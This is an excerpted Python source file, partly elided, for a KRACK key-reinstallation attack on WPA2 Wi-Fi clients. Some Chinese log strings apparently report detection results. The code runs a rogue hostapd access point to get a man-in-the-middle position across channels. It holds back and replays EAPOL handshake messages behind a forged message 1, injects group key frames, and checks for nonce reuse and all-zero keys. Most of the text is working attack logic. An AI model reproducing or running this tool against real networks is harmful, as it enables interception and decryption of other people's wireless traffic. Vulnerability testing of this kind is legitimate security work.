...
class ClientState():
    Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(
        7)
    ...
    def update_state(self, state):
        ...
        self.state = state
        if state == ClientState.Success_Reinstalled or state == ClientState.Success_AllzeroKey:
            stop_flag = True
    ...
    def attack_start(self):
        self.attack_max_iv = 0 if len(
            self.keystreams.keys()) == 0 else max(self.keystreams.keys())
...
class KRAckAttack():
    ...
    def hostapd_add_sta(self, macaddr):
        ...
        self.hostapd_rx_mgmt(
            Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac)/Dot11Auth(seqnum=1))
        ...
        if eapolnum == 1 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
            ...
            if len(client.msg3s) >= 2:
                log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.",
                    color="green", showtime=False)
                log(STATUS, "==> Performing key reinstallation attack!",
                    color="green", showtime=False)
                ...
                log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" %
                    len(client.msg3s), color="green", showtime=False)
        ...
        if p.haslayer(Dot11WEP) or p.haslayer(Dot11CCMP):
            ...
            if client.is_iv_reused(iv):
                ...
                if keystream == client.get_keystream(iv):
                    log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." %
                        iv, color="green", showtime=False)
                    log(STATUS, "檢測結果: 存在KRACK漏洞", color="green", showtime=False)
                    detect_result = 'R2'
                ...
                # Otherwise the client likely installed a new key, i.e., probably an all-zero key
                    ...
                    log(STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." %
                        iv, color="green", showtime=False)
                    log(STATUS, "檢測結果: 存在KRACK漏洞且存在全零金鑰漏洞。",
                        color="green", showtime=False)
                    detect_result = 'R3'
                    client.update_state(ClientState.Success_AllzeroKey)

            elif client.attack_timeout(iv):
                log(WARNING, "KRAck Attack against %s seems to have failed" %
                    client.macaddr)
                detect_result = 'R4'
    ...
    def handle_to_client_groupkey(self, client, p):
        ...
        if p.haslayer(Dot11WEP) and p.addr2 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
            ...
            log(STATUS, "Queued %s group message 1's" %
                len(self.group1), showtime=False)
            if len(self.group1) == 2:
                log(STATUS, "Forwarding first group1 message", showtime=False)
                self.sock_rogue.send(self.group1.pop(
                    0), True, self.netconfig.rogue_channel)
    ...
    def handle_rx_realchan(self):
        ...
        if p.addr1 == self.apmac:
            ...
            if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
                ...
                self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac,
                                    addr2=self.clientmac, addr3=self.apmac), True, self.netconfig.real_channel)
        ...
        # 2. 處理來自原本 AP 的 frames
            ...
            # 決定要不要轉送封包
            might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(
                p, group_flag)
            might_forward = might_forward or (
                group_flag and dot11_is_group(p) and p.haslayer(Dot11WEP))
            ...
            if might_forward:
                if p.addr1 in self.clients:
                    ...
                    if self.handle_to_client_pairwise(client, p):
                        ...
                        print_rx(INFO, "Real channel ",
                                 p, suffix=" -- MitM'ing")
                        self.sock_rogue.send(
                            p, True, self.netconfig.rogue_channel)
                    else:
                        print_rx(INFO, "Real channel ",
                                 p, suffix=" -- MitM'ing")
                        self.sock_rogue.send(
    ...
    def run(self, strict_echo_test=False):
        ...
        hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(
            os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")) + " -dd" + " -K")
        # print(hostapd_path)
        self.hostapd = subprocess.Popen(
            hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        self.hostapd_log = open("hostapd_rogue.log", "w")

        log(STATUS, "Giving the rogue hostapd one second to initialize ...")
        time.sleep(10)

        self.hostapd_ctrl = Ctrl(os.path.realpath(os.path.join(
            self.script_path, "../hostapd/hostapd_ctrl")) + '/' + self.nic_rogue_ap)  # "hostapd_ctrl/"
        ...
        while True:
            sel = select.select(
                [self.sock_real, self.sock_rogue, self.hostapd.stdout], [], [], 0.1)
            ...
            if self.time_forward_group1 and self.time_forward_group1 <= time.time():
                ...
                self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
                self.time_forward_group1 = None
                log(STATUS, "Injected older group message 1: %s" %
...
if __name__ == "__main__":
    ...
    attack = KRAckAttack(args.nic_real_mon, args.nic_real_clientack,
